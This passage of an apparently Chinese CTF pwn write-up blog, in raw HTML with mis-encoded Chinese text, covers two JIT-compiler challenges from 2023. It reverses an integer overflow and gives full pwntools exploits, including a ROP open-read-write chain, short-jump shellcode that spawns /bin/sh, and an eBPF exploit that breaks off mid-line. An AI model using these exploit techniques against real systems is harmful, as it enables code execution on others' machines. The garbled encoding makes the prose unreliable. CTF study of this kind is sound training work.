class="hljs-number">0x55555555</span>,<span class="hljs-number">0x66666666</span>,<br>    lea_ret,<span class="hljs-number">0x88888888</span>,<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>],<br>    libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>],add_esp_4,heap_base+<span class="hljs-number">0x5524</span>,<br>])<br><br>orw = flat([<br>    libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],add_esp_8,heap_base+<span class="hljs-number">0x4c2f</span>,<span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],add_esp_1c,<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br>    ret,ret,ret,ret,<br>    libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],add_esp_1c,<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x5000</span>,<span class="hljs-number">0x30</span>,<br><br>])<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x11111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x111</span>))<br>edit(<span class="hljs-number">2</span>,p32(heap_base+<span class="hljs-number">0x1111</span>)+p32(<span class="hljs-number">0x1</span>))<br><br>edit(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0x4</span>) + p32(heap_base+<span class="hljs-number">0x54a8</span>)*<span class="hljs-number">3</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>)*<span class="hljs-number">4</span> + p32(heap_base + <span class="hljs-number">0x54e8</span>) +p32(<span class="hljs-number">0x2044</span>+elf_base))<br><br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;......................................../flag&#x27;</span>)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x204c)\nc\n&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4bd9</span>))<br>show(<span class="hljs-number">0</span>)<br><br>sl(orw)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>È¢ùexpÂÜôÁöÑÂæà‰π±ÔºåÂáëÂêàÁùÄÁúãÂêß</p>
<h2 id="Ë•øËë´Ëä¶üó°-2023-JIT-üò≠"><a href="#Ë•øËë´Ëä¶üó°-2023-JIT-üò≠" class="headerlink" title="Ë•øËë´Ëä¶üó° 2023 JIT üò≠"></a>Ë•øËë´Ëä¶üó° 2023 JIT üò≠</h2><p>‰ªäÂπ¥Âπ¥ÂàùÁöÑË•øËë´Ëä¶üó°ÊòØüë¥Á¨¨‰∏ÄÊ¨°ÊâìÂ§ßÊØîËµõÔºåÂΩìÂàùüë¥Ëøò‰∏çÊáÇ‰∫ãÔºåÂá∫‰∫Ü‰∏§ÈÅìÁÆÄÂçïÈ¢òÂêéËøò‰∏çÁü•Â•ΩÊ≠πÔºåÁúã‰∫Ü‰∏ÄÁúºjitÔºåÂΩìÊó∂Â∞±Ë¢´ÂêìÂæó‰∫öÈ∫ªÂëÜ‰Ωè‰∫Ü„ÄÇ</p>
<p>Âà®ÂùüÊåñÂá∫Êù•Â∫∑Â∫∑È¢òÔºåÁªìÊûúÈÄÜ‰∫Ü‰∏ÄÂ§©ÈÄÜ‰∫Ü‰∏™Â§ßÊ¶ÇÔºåÁ¨¨‰∫åÂ§©‰∏ÄÁõ¥Âú®ÊÉ≥ÊÄé‰πàËÉΩÊää<code>shellcode</code>ÂÜôÂà∞<code>exec_memory</code>ÈáåÔºåÊúÄÂêéËøòÊòØÁúã‰∫Ürodeüë¥ÁöÑwpÔºåÁî®‰∫Ü<code>jmp short</code> ÁöÑÁü≠Êåá‰ª§ÂÆåÊàêÁ≥ªÁªüË∞ÉÁî®„ÄÇ</p>
<h3 id="ÈÄÜ‰∫ø‰∏ãü§Æü§Æ"><a href="#ÈÄÜ‰∫ø‰∏ãü§Æü§Æ" class="headerlink" title="ÈÄÜ‰∫ø‰∏ãü§Æü§Æ"></a>ÈÄÜ‰∫ø‰∏ãü§Æü§Æ</h3><p>Êï¥‰ΩìÈÄªËæëËøòË°å</p>
<p>mmap‰∫Ü‰∏Ä‰∏™ÂÖ∑ÊúârwxÊùÉÈôêÁöÑ<code>memory</code>ÔºåÁªèËøá<code>Compiler::handleFn</code>Â§ÑÁêÜÂêéÔºåËæìÂÖ•ÁöÑÂÜÖÂÆπ‰ºöÂèòÊàê<code>memory</code>Âá∫ÁöÑÊ±áÁºñÔºåÊúÄÂêéÊâßË°å„ÄÇ</p>
<p>‰∏Ä‰∏™‰∏™Êù•Áúã</p>
<p>Ëøô‰∏™ÁÆóÊòØ‰∏™ÂØπ<code>exec_memory</code>ÁöÑÂàùÂßãÂåñ</p>
<p><img src="/img/C++/14.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">Compiler::</span>handleFn`ÂáΩÊï∞ÈáåÈù¢Ôºå‰ºöËØªÂèñËæìÂÖ•ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇÔºåË¶ÅÊ±Ç‰∏∫\xffÔºåÂπ∂ËØªÂèñÁ¨¨<span class="hljs-number">1</span>„ÄÅ<span class="hljs-number">2</span>‰∏™Â≠óËäÇ‰∏∫`args`Âíå`locals<br></code></pre></td></tr></table></figure>

<p><img src="/img/C++/15.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ËøõÂÖ•<code>Compiler::creatFunc</code>Ôºå<code>args</code> Ë¶Å Â∞è‰∫é8Ôºå<code>locals</code>Ë¶ÅÂ∞è‰∫é0x20ÔºåÁÑ∂ÂêéÂú®<code>exec_memory</code>ÈáåÁî®<code>sub rsp, 8*locals</code>ÂºÄ‰∏Ä‰∏™Ê†àÁ©∫Èó¥</p>
<p><img src="/img/C++/16.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÁÑ∂ÂêéËøõÂÖ•Ê†∏ÂøÉÂáΩÊï∞<code>Compiler::handleFnBody()</code></p>
<p>ÈáåÈù¢ÁöÑ<code>Compiler::var2idx</code>ÊòØÂ∞Ü‰º†ÂÖ•ÁöÑÂèÇÊï∞ËøõË°åÂ§ÑÁêÜÔºåÂä®Ë∞É‰∏Ä‰∏ãÂèëÁé∞ÊòØ[rbp - ret_value*8]</p>
<p>Â≠òÂú®Êï¥Êï∞Ê∫¢Âá∫ÊºèÊ¥ûÔºåÂèØ‰ª•ÁúãÂà∞‰∏äÂ±ÇÂáΩÊï∞Êé•ÂèóËøîÂõûÂÄºÁöÑÂèÇÊï∞ÊòØÂçïÂ≠óËäÇÁöÑÔºåÊâÄ‰ª•ÂΩìvarib‰∏∫0xa0Êó∂ÂèØ‰ª•‰ΩøËøîÂõûÂÄº‰∏∫0ÔºåÂèØ‰ª•Áõ¥Êé•ÂØπrbpËøõË°åÊìç‰Ωú</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span> __cdecl <span class="hljs-title">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span></span><br><span class="hljs-function"></span>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )              <span class="hljs-comment">//varib!=0x7f </span><br>    <span class="hljs-built_in">fatal</span>();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )             <span class="hljs-comment">//varib &lt; 0x80</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                  <span class="hljs-number">1000</span>     <span class="hljs-number">1010</span>             <span class="hljs-comment">//varib &gt; 0x80</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )    <span class="hljs-comment">//ÂΩìlocalsËÆæÁΩÆ‰∏∫max 0x20,varib max = 0xa0</span><br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">fatal</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/C++/17.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÂêéÈù¢Â∞±ÊòØ0-5ÁöÑ<code>opcode</code>Ôºå6ÁöÑÂà©Áî®Êù°‰ª∂Â§™tmÁÉ¶‰∫Üüë¥Â∞±Ê≤°Áúã</p>
<p>Âü∫Êú¨‰∏äÂ∞±ÊòØ</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        v0 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// ÊÑüËßâÊòØret</span><br>        <span class="hljs-keyword">return</span> Compiler::<span class="hljs-built_in">var2idx</span>(v0);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        v2 = IRstream::<span class="hljs-built_in">getop</span>();                 <span class="hljs-comment">// mov [rbp - var],num</span><br>        var = Compiler::<span class="hljs-built_in">var2idx</span>(v2);<br>        imm = IRstream::<span class="hljs-built_in">getimm</span>();<br>        AsmHelper::<span class="hljs-built_in">imm2var</span>(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1 = Compiler::<span class="hljs-built_in">var2idx</span>(v3);<br>        v4 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2 = Compiler::<span class="hljs-built_in">var2idx</span>(v4);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2);               <span class="hljs-comment">// mov [rbp-var2],[rbp-var1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1);<br>        AsmHelper::<span class="hljs-built_in">regassign</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        v5 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v5);<br>        v6 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_0 = Compiler::<span class="hljs-built_in">var2idx</span>(v6);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_0);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_0);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x21</span>u);             <span class="hljs-comment">// and [rbp-var2_0],[rbp-var1_0]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        v7 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v7);<br>        v8 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_1 = Compiler::<span class="hljs-built_in">var2idx</span>(v8);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_1);<br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_1);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">9u</span>);                <span class="hljs-comment">// or [rbp-var2-1],[rbp-var1_1]</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        v9 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var1_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v9);<br>        v10 = IRstream::<span class="hljs-built_in">getop</span>();<br>        var2_2 = Compiler::<span class="hljs-built_in">var2idx</span>(v10);<br>        AsmHelper::<span class="hljs-built_in">var2reg</span>(var2_2);             <span class="hljs-comment">// xor [rbp-var2_2],[rbp-var2_1]</span><br>        AsmHelper::<span class="hljs-built_in">pvar2reg</span>(var1_2);<br>        AsmHelper::<span class="hljs-built_in">regarith</span>(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br>       <br></code></pre></td></tr></table></figure>

<p>ÊúÄÂêé<code>AsmHelper::func_ret</code>ÊÅ¢Â§çÊ†àÂ∏ßÔºåËøôÊ†∑<code>just in time</code> Âü∫Êú¨‰∏äÂ∞±Â•Ω‰∫Ü</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">JITHelper::</span>finailize()`Â∞Ü`exec_memory`ÁöÑ`rwx`ÊùÉÈôêÊîπ‰∏∫`r_x<br></code></pre></td></tr></table></figure>

<p>ÂêéÈù¢ÁöÑ‰∏ÄËøû‰∏≤checkÊòØ‰ΩøÁ¨¨‰∏ÄÊ¨°ËΩ¨Ê±áÁºñÁöÑËæìÂÖ•ÁöÑ<code>id</code>Âíå<code>args</code>ÂøÖÈ°ª‰∏∫0</p>
<p><img src="/img/C++/18.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÁÑ∂ÂêéÂ∞±ÊòØÊâßË°å‰∫Ü<code>exec_memory</code>‰∫Ü</p>
<h3 id="Âà©Áî®üè≥Ô∏èüè≥Ô∏è"><a href="#Âà©Áî®üè≥Ô∏èüè≥Ô∏è" class="headerlink" title="Âà©Áî®üè≥Ô∏èüè≥Ô∏è"></a>Âà©Áî®üè≥Ô∏èüè≥Ô∏è</h3><p>ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåÊâßË°åÁöÑÊó∂ÂÄôÊ≤°Êúâ<code>write</code>ÊùÉÈôêÔºåüë¥ËØ•ÊÄé‰πàÂæÄ‰∏äÂÜô<code>shellcode</code>Âë¢</p>
<p>üë¥‰∏ÄÂºÄÂßãÊÉ≥ÁöÑÊòØÂú®Ê†à‰∏äÂ∏ÉÁΩÆ<code>rop</code>ÈìæÔºå‰ΩÜÊòØË¶ÅÂÖàÊ≥ÑÈú≤<code>libc</code>Ôºå‰πü<code>pass</code>‰∫Ü</p>
<p>ËøôÊòØÊÄé‰πàÁªò‰∫ãÊçè</p>
<p>ÂêéÊù•Áúã‰∫Ürodeüë¥ÁöÑwpÔºåÂèàÂ≠¶Âà∞‰∫ÜÊñ∞ÁöÑ‰∏úË•ø</p>
<p>Âõ†‰∏∫case 1‰∏≠movÂà∞Ê†à‰∏äÁöÑÊòØ8Â≠óËäÇÔºå‰∫éÊòØÂèØ‰ª•ÊòØ<code>‚Äúxor rax, rax; jmp short&quot;</code>ËøôÁßçÁü≠Ë∑≥ËΩ¨‰ª£Á†ÅÔºåÈÇ£üë¥ÊáÇÂï¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x1ddf)\nc\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\xff\x00\x00\x20&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8b&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>                            <span class="hljs-comment">#mov [rbp-0xb*8], /bin/sh</span><br>payload += <span class="hljs-string">b&#x27;\x01\x8a&#x27;</span> + p64(<span class="hljs-number">0xffffffffff00</span>)                       <span class="hljs-comment">#mov [rbp-0xa*8], 0xffffffffff00</span><br>payload += <span class="hljs-string">b&#x27;\x01\x89&#x27;</span> + p64(<span class="hljs-number">0x47</span>)                                 <span class="hljs-comment">#mov [rbp-9*8], 0x47</span><br>payload += <span class="hljs-string">b&#x27;\x01\x88&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xf6\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rsi, rsi; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x87&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xd2\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rdx, rdx; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x86&#x27;</span> + <span class="hljs-string">b&quot;\x48\x31\xc0\xeb\x0c\x00\x00\x00&quot;</span>       <span class="hljs-comment">#xor rax, rax; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x85&#x27;</span> + <span class="hljs-string">b&quot;\x04\x3b\xeb\x0d\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#add al, 0x3b; jmp 0x11</span><br>payload += <span class="hljs-string">b&#x27;\x01\x84&#x27;</span> + <span class="hljs-string">b&quot;\x0f\x05\x00\x00\x00\x00\x00\x00&quot;</span>       <span class="hljs-comment">#syscall</span><br>payload += <span class="hljs-string">b&#x27;\x03\xa0\x8a&#x27;</span>                                         <span class="hljs-comment">#and [rbp], [rbp-0xa*8]</span><br>payload += <span class="hljs-string">b&#x27;\x04\xa0\x89&#x27;</span>                                         <span class="hljs-comment">#or [rbp], [rbp-9*8]</span><br>payload += <span class="hljs-string">b&#x27;\x00\x8b&#x27;</span>                                             <span class="hljs-comment">#mov rdi,[rbp-b*8];ret</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="WMCTF-2023-JITü•µ"><a href="#WMCTF-2023-JITü•µ" class="headerlink" title="WMCTF 2023 JITü•µ"></a>WMCTF 2023 JITü•µ</h2><p>just in time ÔºåÂèàÊòØ‰Ω†ÔºÅÔºÅ</p>
<p>üë¥Âè™ÊòØÊÉ≥ÊääC++pwnÈ¢òÂ≠¶ÊòéÁôΩÔºåüë¥Êúâ‰ªÄ‰πàÈîôÔºåË¶ÅÊãø2000Ë°åÁöÑÂ±éÂ±±‰ª£Á†ÅÊù•ÊÅ∂ÂøÉüë¥</p>
<h3 id="ÂÜçÈÄÜ‰∫ø‰∏ã"><a href="#ÂÜçÈÄÜ‰∫ø‰∏ã" class="headerlink" title="ÂÜçÈÄÜ‰∫ø‰∏ã"></a>ÂÜçÈÄÜ‰∫ø‰∏ã</h3><p>ÂÖàËæìÂÖ•<code>program</code>Âíå<code>memory</code>Ôºå<code>program</code>Ë¶ÅÊòØ16ËøõÂà∂Â≠óÁ¨¶‰∏≤Ôºå<code>memory</code>Ë¶ÅÊòØ<code>len(program) //2</code></p>
<p><img src="/img/C++/19.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ËøôËæπÂ§ßËá¥ÊòØÂàõÂª∫ËôöÊãüÊú∫Âπ∂ËøõË°å‰∏ÄÁ≥ªÂàóÂàùÂßãÂåñÁöÑËøáÁ®ãÔºåÂÖ∑‰ΩìÊìç‰Ωúüë¥‰πüÊ≤°ÈÄÜÊòéÁôΩ</p>
<p><img src="/img/C++/20.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÁÑ∂ÂêéÂ∞±ÊòØÊ†∏ÂøÉ<code>code</code></p>
<p><img src="/img/C++/21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><code>func_8510</code>ÈáåÔºåÈÄöËøá<code>func_84e0--&gt;func_8370--&gt;func_5a50</code>Ëøô‰∏™2000Ë°åÁöÑÂ±éÂ±±ÊääËæìÂÖ•ÁöÑ<code>program</code>ÁøªËØëÊàêÊ±áÁºñÂ≠òÂÇ®Âú®Áî≥ËØ∑Âá∫Êù•ÁöÑ<code>chunk</code>Èáå</p>
<p><code>mmap</code>‰∏ÄÁâáÂÜÖÂ≠òÔºåÊää<code>chunk</code>ÈáåÁöÑÊ±áÁºñ<code>copy</code>ËøáÂéªÔºåÁÑ∂Âêé<code>mprotect</code>ÊîπÊàê<code>r_x</code>ÊùÉÈôê</p>
<p><code>call rax</code>Â∞±ÊòØÊâßË°åÁøªËØëÁöÑÊ±áÁºñ</p>
<p><img src="/img/C++/22.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÊúÄÂêéÊúâ‰∏™<code>result</code>ËæìÂá∫ÁöÑÊòØÊâßË°åÂÆåÂêéÁöÑÂØÑÂ≠òÂô®<code>rax</code>ÂÄº</p>
<p>Â∑Æ‰∏çÂ§ö‰∫ÜÔºåÂø´Âêê‰∫Ü</p>
<p>üò≠üò≠üò≠</p>
<h3 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h3><p>ÈóÆÈ¢òÊù•‰∫ÜÔºåÈÇ£‰∏™2000Ë°åÁöÑ‰ª£Á†ÅÁ≠âüë¥ÁúãÂÆå‰º∞ËÆ°ÊòØÂ§©ÈÉΩ‰∫Æ‰∫ÜÔºåüë¥ÊûúÊñ≠ÂéªÁúãwpÔºåÂèëÁé∞ÂæàÂ§öüë¥ÈÉΩËØ¥ËøôÊòØ<code>ebpf</code></p>
<p>üë¥ÔºöÔºüÔºüÔºü</p>
<p>üë¥ÔºöÂ¶àÂ¶àÁîüÁöÑÔºåËøôÊòØ‰∏™‰ªÄ‰πàÁé©ÊÑè</p>
<p>ÁÑ∂Âêéüë¥Â∞±ÂéªÊâæËøôÁé©ÊÑèÁöÑ<a target="_blank" rel="noopener" href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">Êåá‰ª§ÈõÜ</a></p>
<p>‰∏ÄËØïÔºåÂØπ‰∏ä‰∫ÜÔºåÈÇ£Â∞±Â•ΩÂäû‰∫Ü</p>
<p>ÂÖàËøû‰∏äÊâæ‰∏™libcÂÄºÁªôraxÔºåÊâìÂç∞Âá∫Êù•Â∫∑Â∫∑libcÁâàÊú¨</p>
<p>ÁÑ∂ÂêéÂ∞±ÊòØoggË¶ÜÁõñËøîÂõûÂú∞ÂùÄÔºåÂõ†‰∏∫üë¥Ëé´ÂæóÊâæÂà∞syscall</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># rax:0</span><br><span class="hljs-comment"># rdi:1</span><br><span class="hljs-comment"># rsi:2</span><br><span class="hljs-comment"># rdx:3</span><br><span class="hljs-comment"># r9:4</span><br><span class="hljs-comment"># r8:5</span><br><span class="hljs-comment"># rbx:6</span><br><span class="hljs-comment"># r13:7</span><br><span class="hljs-comment"># r14:8</span><br><span class="hljs-comment"># r15:9</span><br><span class="hljs-comment"># rbp:a</span><br><br>program = <span 